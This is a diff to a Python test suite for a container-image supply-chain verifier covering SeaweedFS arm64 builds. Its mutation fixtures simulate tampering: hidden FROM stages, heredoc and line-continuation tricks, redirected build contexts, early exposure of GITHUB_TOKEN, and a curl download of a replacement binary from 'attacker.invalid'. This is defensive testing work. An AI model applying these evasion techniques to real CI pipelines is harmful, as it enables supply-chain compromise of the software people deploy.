@@ -88,6 +88,26 @@ class TrustedImageContractTests(unittest.TestCase):
             self.assertEqual(caught.exception.code, "BOOTSTRAP_OBSERVATION")
 
     def test_contract_mutations_fail_with_stable_error_codes(self) -> None:
+        def replace_and_rehash_containerfile(
+            root: Path,
+            old: str,
+            new: str,
+        ) -> None:
+            container_path = root / "bootstrap/seaweedfs/v4.39/Containerfile"
+            container = container_path.read_text(encoding="utf-8")
+            self.assertIn(old, container)
+            container = container.replace(old, new, 1)
+            container_path.write_text(container, encoding="utf-8")
+            container_hash = hashlib.sha256(container.encode("utf-8")).hexdigest()
+            source_path = root / verifier.SOURCE_PATH
+            source = json.loads(source_path.read_text(encoding="utf-8"))
+            source["containerfile_sha256"] = container_hash
+            source_path.write_text(json.dumps(source), encoding="utf-8")
+            contract_path = root / verifier.CONTRACT_PATH
+            contract = json.loads(contract_path.read_text(encoding="utf-8"))
+            contract["source"]["containerfile"]["sha256"] = container_hash
+            contract_path.write_text(json.dumps(contract), encoding="utf-8")
+
         def remove_buildkit(root: Path) -> None:
             path = root / verifier.CONTRACT_PATH
             data = json.loads(path.read_text(encoding="utf-8"))
@@ -111,6 +131,114 @@ class TrustedImageContractTests(unittest.TestCase):
                 "docker.io/library/golang@sha256:" + "a" * 64
             )
             path.write_text(json.dumps(data), encoding="utf-8")
+
+        def hide_changed_frontend_behind_comment(root: Path) -> None:
+            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
+            reviewed = source["build_inputs"]["dockerfile_frontend"]
+            replacement = "docker/dockerfile:1.7.1@sha256:" + "a" * 64
+            replace_and_rehash_containerfile(
+                root,
+                f"# syntax={reviewed}",
+                f"# syntax={replacement}\n# retained text is not an instruction: {reviewed}",
+            )
+
+        def add_unreviewed_escape_directive(root: Path) -> None:
+            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
+            reviewed = source["build_inputs"]["dockerfile_frontend"]
+            replace_and_rehash_containerfile(
+                root,
+                f"# syntax={reviewed}\n",
+                f"# syntax={reviewed}\n# escape=`\n",
+            )
+
+        def hide_changed_go_arg_behind_comment(root: Path) -> None:
+            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
+            reviewed = source["build_inputs"]["go"]
+            replacement = "golang:1.25.12-alpine@sha256:" + "a" * 64
+            replace_and_rehash_containerfile(
+                root,
+                f"ARG GO_IMAGE={reviewed}",
+                f"ARG GO_IMAGE={replacement}\n# retained text is not an ARG: {reviewed}",
+            )
+
+        def bypass_go_arg_in_builder_stage(root: Path) -> None:
+            source = json.loads((root / verifier.SOURCE_PATH).read_text(encoding="utf-8"))
+            reviewed = source["build_inputs"]["go"]
+            replacement = "golang:1.25.12-alpine@sha256:" + "b" * 64
+            replace_and_rehash_containerfile(
+                root,
+                "FROM --platform=$BUILDPLATFORM ${GO_IMAGE} AS builder",
+                (
+                    f"FROM --platform=$BUILDPLATFORM {replacement} AS builder\n"
+                    "# retained text is not a stage: "
+                    "FROM --platform=$BUILDPLATFORM ${GO_IMAGE} AS builder\n"
+                    f"# reviewed ARG text alone is insufficient: {reviewed}"
+                ),
+            )
+
+        def hide_scratch_stage_in_continuation(root: Path) -> None:
+            replace_and_rehash_containerfile(
+                root,
+                "FROM scratch",
+                "RUN echo decoy \\\nFROM scratch",
+            )
+
+        def split_hidden_from_keyword(root: Path) -> None:
+            replace_and_rehash_containerfile(
+                root,
+                "FROM scratch\n",
+                (
+                    "FROM scratch\n"
+                    "FRO\\\n"
+                    "M alpine:3.23.3 AS hidden-final\n"
+                ),
+            )
+
+        def hide_certificates_stage_in_heredoc(root: Path) -> None:
+            replace_and_rehash_containerfile(
+                root,
+                "FROM ${RUNTIME_IMAGE} AS certificates",
+                "RUN <<EOF\nFROM ${RUNTIME_IMAGE} AS certificates\nEOF",
+            )
+
+        def split_hidden_heredoc_opener(root: Path) -> None:
+            replace_and_rehash_containerfile(
+                root,
+                "FROM ${RUNTIME_IMAGE} AS certificates",
+                "RUN <\\\n<EOF\nFROM ${RUNTIME_IMAGE} AS certificates\nEOF",
+            )
+
+        def add_networked_builder_replacement(root: Path) -> None:
+            replace_and_rehash_containerfile(
+                root,
+                "\n\nFROM ${RUNTIME_IMAGE} AS certificates",
+                (
+                    "\nRUN --network=default curl https://attacker.invalid/weed "
+                    "-o /out/weed\n\nFROM ${RUNTIME_IMAGE} AS certificates"
+                ),
+            )
+
+        def quote_checksum_pipe_as_data(root: Path) -> None:
+            replace_and_rehash_containerfile(
+                root,
+                "      | sha256sum -c - && \\\n",
+                "      '|' sha256sum -c - && \\\n",
+            )
+
+        def suppress_source_commit_expansion(root: Path) -> None:
+            replace_and_rehash_containerfile(
+                root,
+                (
+                    '      -ldflags="-s -w -extldflags -static -X '
+                    "github.com/seaweedfs/seaweedfs/weed/util/version.COMMIT="
+                    '${SOURCE_COMMIT}" \\\n'
+                ),
+                (
+                    "      -ldflags='-s -w -extldflags -static -X "
+                    "github.com/seaweedfs/seaweedfs/weed/util/version.COMMIT="
+                    "${SOURCE_COMMIT}' \\\n"
+                ),
+            )
 
         def alter_module_bundle_hash(root: Path) -> None:
             for relative in (verifier.SOURCE_PATH, verifier.CONTRACT_PATH):
@@ -186,6 +314,20 @@ class TrustedImageContractTests(unittest.TestCase):
             )
             path.write_text(workflow, encoding="utf-8")
 
+        def hide_early_credentials_after_login_comment(root: Path) -> None:
+            path = root / ".github/workflows/seaweedfs-arm64.yml"
+            marker = "      - name: Log in to GHCR for the quarantine push\n"
+            workflow = path.read_text(encoding="utf-8")
+            self.assertIn(marker, workflow)
+            workflow = workflow.replace(
+                marker,
+                "      # - name: Log in to GHCR for the quarantine push\n"
+                "          echo '${{ secrets.GITHUB_TOKEN }}' >/dev/null\n"
+                + marker,
+                1,
+            )
+            path.write_text(workflow, encoding="utf-8")
+
         def change_final_retention(root: Path) -> None:
             path = root / ".github/workflows/seaweedfs-arm64.yml"
             workflow = path.read_text(encoding="utf-8")
@@ -208,6 +350,57 @@ class TrustedImageContractTests(unittest.TestCase):
                 "          no-cache: true\n",
                 "          no-cache: true\n"
                 "          cache-from: type=gha,scope=seaweedfs-4.39-arm64\n",
+                1,
+            )
+            path.write_text(workflow, encoding="utf-8")
+
+        def override_reviewed_go_image(root: Path) -> None:
+            path = root / ".github/workflows/seaweedfs-arm64.yml"
+            workflow = path.read_text(encoding="utf-8").replace(
+                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n",
+                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n"
+                "            GO_IMAGE=golang:latest\n",
+                1,
+            )
+            path.write_text(workflow, encoding="utf-8")
+
+        def override_reviewed_go_image_after_blank(root: Path) -> None:
+            path = root / ".github/workflows/seaweedfs-arm64.yml"
+            workflow = path.read_text(encoding="utf-8").replace(
+                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n",
+                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n"
+                "\n"
+                "            GO_IMAGE=golang:latest\n",
+                1,
+            )
+            path.write_text(workflow, encoding="utf-8")
+
+        def redirect_reviewed_containerfile(root: Path) -> None:
+            path = root / ".github/workflows/seaweedfs-arm64.yml"
+            workflow = path.read_text(encoding="utf-8").replace(
+                "          file: bootstrap/seaweedfs/v4.39/Containerfile",
+                "          file: attacker/Containerfile",
+                1,
+            )
+            path.write_text(workflow, encoding="utf-8")
+
+        def continue_context_plain_scalar(root: Path) -> None:
+            path = root / ".github/workflows/seaweedfs-arm64.yml"
+            workflow = path.read_text(encoding="utf-8").replace(
+                "          context: seaweedfs-src\n",
+                "          context: seaweedfs-src\n"
+                "            attacker-context\n",
+                1,
+            )
+            path.write_text(workflow, encoding="utf-8")
+
+        def truncate_build_step_with_comment_decoy(root: Path) -> None:
+            path = root / ".github/workflows/seaweedfs-arm64.yml"
+            workflow = path.read_text(encoding="utf-8").replace(
+                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n",
+                "            GO_VENDOR_BUNDLE_SHA256=${{ env.GO_VENDOR_BUNDLE_SHA256 }}\n"
+                "          # - name: Verify the published platform\n"
+                "          context: attacker-context\n",
                 1,
             )
             path.write_text(workflow, encoding="utf-8")
@@ -256,6 +449,30 @@ class TrustedImageContractTests(unittest.TestCase):
             )
             path.write_text(workflow, encoding="utf-8")
 
+        def derive_candidate_from_promotion_attempt(root: Path) -> None:
+            path = root / ".github/workflows/seaweedfs-arm64.yml"
+            workflow = path.read_text(encoding="utf-8").replace(
+                'builder_run_attempt = str(release["builder"]["run_attempt"])',
+                'builder_run_attempt = os.environ["GITHUB_RUN_ATTEMPT"]',
+                1,
+            )
+            path.write_text(workflow, encoding="utf-8")
+
+        def move_promotion_preflight_after_tag(root: Path) -> None:
+            path = root / ".github/workflows/seaweedfs-arm64.yml"
+            workflow = path.read_text(encoding="utf-8").replace(
+                "python3 scripts/verify_trusted_image.py promotion-preflight",
+                "python3 scripts/verify_trusted_image.py candidate",
+                1,
+            )
+            workflow = workflow.replace(
+                '          "${CRANE_BIN}" tag',
+                "          python3 scripts/verify_trusted_image.py promotion-preflight\n"
+                '          "${CRANE_BIN}" tag',
+                1,
+            )
+            path.write_text(workflow, encoding="utf-8")
+
         def permit_runtime(root: Path) -> None:
             path = root / verifier.ADMISSION_PATH
             data = json.loads(path.read_text(encoding="utf-8"))
@@ -278,21 +495,40 @@ class TrustedImageContractTests(unittest.TestCase):
             (remove_buildkit, "TOOLCHAIN_CLOSED_WORLD"),
             (switch_rekor_api_without_migration, "REKOR_API_CONTRACT"),
             (alter_containerfile, "CONTAINERFILE_HASH"),
-            (redirect_source_build_input, "SOURCE_BUILD_INPUT_USE"),
+            (redirect_source_build_input, "CONTAINERFILE_GLOBAL_ARGS"),
+            (hide_changed_frontend_behind_comment, "CONTAINERFILE_SYNTAX_DIRECTIVE"),
+            (add_unreviewed_escape_directive, "CONTAINERFILE_SYNTAX_DIRECTIVE"),
+            (hide_changed_go_arg_behind_comment, "CONTAINERFILE_GLOBAL_ARGS"),
+            (bypass_go_arg_in_builder_stage, "CONTAINERFILE_STAGE_PLAN"),
+            (hide_scratch_stage_in_continuation, "CONTAINERFILE_STAGE_PLAN"),
+            (split_hidden_from_keyword, "CONTAINERFILE_STAGE_PLAN"),
+            (hide_certificates_stage_in_heredoc, "CONTAINERFILE_HEREDOC"),
+            (split_hidden_heredoc_opener, "CONTAINERFILE_HEREDOC"),
+            (add_networked_builder_replacement, "CONTAINERFILE_BUILDER_STAGE"),
+            (quote_checksum_pipe_as_data, "CONTAINERFILE_BUILDER_RUN"),
+            (suppress_source_commit_expansion, "CONTAINERFILE_BUILDER_RUN"),
             (alter_module_bundle_hash, "MODULE_INPUT_HASH"),
-            (permit_networked_module_build, "MODULE_BUILD_POLICY"),
+            (permit_networked_module_build, "CONTAINERFILE_BUILDER_RUN"),
             (permit_legacy_cosign_records, "COSIGN_FORMAT_CONTRACT"),
             (unpin_action, "ACTION_NOT_SHA_PINNED"),
             (add_anonymous_unpinned_action, "ACTION_NOT_SHA_PINNED"),
             (add_unapproved_pinned_action, "WORKFLOW_ACTION_CLOSED_WORLD"),
             (expose_credentials_before_buildx_verification, "BUILDX_CREDENTIAL_BOUNDARY"),
+            (hide_early_credentials_after_login_comment, "BUILDX_CREDENTIAL_BOUNDARY"),
             (change_final_retention, "FINAL_RETENTION"),
             (redirect_image_repository, "IMAGE_WORKFLOW_BINDING"),
             (restore_mutable_gha_cache, "BUILD_CACHE_POLICY"),
+            (override_reviewed_go_image, "BUILD_ACTION_POLICY"),
+            (override_reviewed_go_image_after_blank, "BUILD_ACTION_POLICY"),
+            (redirect_reviewed_containerfile, "BUILD_ACTION_POLICY"),
+            (continue_context_plain_scalar, "BUILD_ACTION_POLICY"),
+            (truncate_build_step_with_comment_decoy, "BUILD_ACTION_POLICY"),
             (permit_issue_branch_publication, "MAIN_ONLY_PUBLICATION"),
             (detach_buildx_from_docker_plugin_discovery, "BUILDX_PLUGIN_DISCOVERY"),
             (conflate_workflow_and_source_sha, "WORKFLOW_SHA_SEMANTICS"),
             (remove_run_attempt_from_candidate_artifact, "WORKFLOW_CONTRACT_LITERAL"),
+            (derive_candidate_from_promotion_attempt, "WORKFLOW_CONTRACT_LITERAL"),
+            (move_promotion_preflight_after_tag, "PROMOTION_PREFLIGHT_ORDER"),
             (remove_promotion_dependency, "PROMOTION_DEPENDENCY"),
             (permit_runtime, "ADMISSION_RUNTIME_STATE"),
             (inject_command_into_approved_run_step, "WORKFLOW_HASH"),
@@ -428,10 +664,77 @@ class TrustedImageContractTests(unittest.TestCase):
                 verifier._validate_runtime(release, smoke_path, inspect_path)
             self.assertEqual(caught.exception.code, "RUNTIME_INSPECT_USER")
 
+    def test_promotion_preflight_binds_lineage_before_credentials(self) -> None:
+        digest = "sha256:" + "b" * 64
+        release = {
+            "digest": digest,
+            "builder": {"run_id": "67890", "run_attempt": "3"},
+            "actions_artifact": {
+                "candidate_name": "seaweedfs-4.39-arm64-candidate-67890-3",
+            },
+        }
+        with mock.patch.object(
+            verifier,
+            "validate_release_bundle",
+            return_value=release,
+        ):
+            verifier.validate_promotion_preflight(
+                ROOT,
+                Path("candidate-evidence"),
+                "67890",
+                "4",
+                digest,
+                "seaweedfs-4.39-arm64-candidate-67890-3",
+            )
+            candidate_name = release["actions_artifact"]["candidate_name"]
+            invalid_cases = (
+                (
+                    "99999",
+                    "4",
+                    digest,
+                    candidate_name,
+                    "PROMOTION_RUN_IDENTITY",
+                ),
+                (
+                    "67890",
+                    "2",
+                    digest,
+                    candidate_name,
+                    "PROMOTION_ATTEMPT_ORDER",
+                ),
+                (
+                    "67890",
+                    "4",
+                    "sha256:" + "c" * 64,
+                    candidate_name,
+                    "PROMOTION_TARGET_DIGEST",
+                ),
+                (
+                    "67890",
+                    "4",
+                    digest,
+                    "seaweedfs-4.39-arm64-candidate-67890-4",
+                    "PROMOTION_CANDIDATE_ARTIFACT",
+                ),
+            )
+            for run_id, attempt, target, artifact, expected_code in invalid_cases:
+                with self.subTest(expected_code=expected_code):
+                    with self.assertRaises(verifier.ContractError) as caught:
+                        verifier.validate_promotion_preflight(
+                            ROOT,
+                            Path("candidate-evidence"),
+                            run_id,
+                            attempt,
+                            target,
+                            artifact,
+                        )
+                    self.assertEqual(caught.exception.code, expected_code)
+
     def test_promotion_is_bound_to_the_candidate_release_snapshot(self) -> None:
         contract = verifier.load_contract(ROOT)
         digest = "sha256:" + "b" * 64
         builder = {"run_id": "67890", "run_attempt": "3"}
+        promotion_attempt = "4"
         candidate_artifact = "seaweedfs-4.39-arm64-candidate-67890-3"
 
         with tempfile.TemporaryDirectory() as directory:
@@ -465,7 +768,7 @@ class TrustedImageContractTests(unittest.TestCase):
             release["promotion"] = {
                 "status": "verified",
                 "run_id": builder["run_id"],
-                "run_attempt": builder["run_attempt"],
+                "run_attempt": promotion_attempt,
                 "trusted_tag": contract["image"]["trusted_tag"],
                 "trusted_tag_role": contract["image"]["trusted_tag_role"],
                 "trusted_tag_digest": digest,
@@ -476,7 +779,7 @@ class TrustedImageContractTests(unittest.TestCase):
             }
             release["actions_artifact"] = {
                 "role": contract["evidence"]["actions_artifact_role"],
-                "final_name": "seaweedfs-4.39-arm64-67890-3",
+                "final_name": "seaweedfs-4.39-arm64-67890-4",
                 "retention_days": contract["evidence"]["final_retention_days"],
             }
             release["artifacts"] = {
@@ -497,7 +800,7 @@ class TrustedImageContractTests(unittest.TestCase):
                 "trusted_tag_digest": digest,
                 "promoted_at": "2026-07-15T00:00:00Z",
                 "run_id": builder["run_id"],
-                "run_attempt": builder["run_attempt"],
+                "run_attempt": promotion_attempt,
                 "tool": {
                     "name": "crane",
                     "version": contract["toolchain"]["crane"]["version"],
@@ -515,12 +818,63 @@ class TrustedImageContractTests(unittest.TestCase):
             }
             promotion_path.write_text(json.dumps(promotion), encoding="utf-8")
 
+            self.assertEqual(
+                verifier._expected_actions_artifact_name(release, False),
+                "seaweedfs-4.39-arm64-candidate-67890-3",
+            )
+            self.assertEqual(
+                verifier._expected_actions_artifact_name(release, True),
+                "seaweedfs-4.39-arm64-67890-4",
+            )
             verifier._validate_promotion(
                 release,
                 contract,
                 promotion_path,
                 candidate_path,
             )
+
+            promotion["candidate"]["artifact_name"] = (
+                "seaweedfs-4.39-arm64-candidate-67890-4"
+            )
+            promotion_path.write_text(json.dumps(promotion), encoding="utf-8")
+            with self.assertRaises(verifier.ContractError) as caught:
+                verifier._validate_promotion(
+                    release,
+                    contract,
+                    promotion_path,
+                    candidate_path,
+                )
+            self.assertEqual(caught.exception.code, "PROMOTION_CANDIDATE_ARTIFACT")
+            promotion["candidate"]["artifact_name"] = candidate_artifact
+
+            promotion["run_attempt"] = "2"
+            release["promotion"]["run_attempt"] = "2"
+            promotion_path.write_text(json.dumps(promotion), encoding="utf-8")
+            with self.assertRaises(verifier.ContractError) as caught:
+                verifier._validate_promotion(
+                    release,
+                    contract,
+                    promotion_path,
+                    candidate_path,
+                )
+            self.assertEqual(caught.exception.code, "PROMOTION_ATTEMPT_ORDER")
+            promotion["run_attempt"] = promotion_attempt
+            release["promotion"]["run_attempt"] = promotion_attempt
+
+            release["promotion"]["run_attempt"] = "5"
+            promotion_path.write_text(json.dumps(promotion), encoding="utf-8")
+            with self.assertRaises(verifier.ContractError) as caught:
+                verifier._validate_promotion(
+                    release,
+                    contract,
+                    promotion_path,
+                    candidate_path,
+                )
+            self.assertEqual(
+                caught.exception.code,
+                "RELEASE_PROMOTION_RUN_IDENTITY",
+            )
+            release["promotion"]["run_attempt"] = promotion_attempt
 
             candidate_release["component"] = "mutated-after-validation"
             candidate_path.write_text(json.dumps(candidate_release), encoding="utf-8")
